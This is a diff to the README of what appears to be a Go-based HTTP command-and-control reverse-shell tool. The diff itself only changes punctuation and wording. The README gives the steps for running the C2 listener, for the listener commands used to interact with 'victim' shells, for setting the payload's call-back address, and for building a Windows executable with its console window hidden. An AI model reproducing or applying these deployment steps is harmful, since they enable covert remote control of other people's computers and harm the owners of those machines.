@@ -7,22 +7,22 @@
 
 # Usage
 
-### Change listener port
+### Change listener port:
 In c2/httpC2.go:
 ```go
 const Port = "80" // change port here
 ```
 
-### Start listener
+### Start listener:
 ```sh
 go run c2/httpC2.go
 ```
-If you want the listener on port 80 or 443 you must use sudo:
+If you want the listener to listen on port 80 or 443 you must use sudo:
 ```sh
 sudo go run c2/httpC2.go
 ```
 
-### Listener commands
+### Listener commands:
 ```
 shells - list all active shells
 shell <shell_name> - interact with specifc shell
@@ -30,13 +30,13 @@ quit - quit shell (closes shell on victim)
 exit - return to main menu (shell continues to run)
 ```
 
-### Set call back host
+### Set call back host:
 In payload/xShell.go:
 ```go
 const ServerAddr = "127.0.0.1:80" // change this to your servers IP/Host
 ```
 
-### Build shell
+### Build shell:
 ```sh
 GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui -o xShell.exe payload/xShell.go
 ```
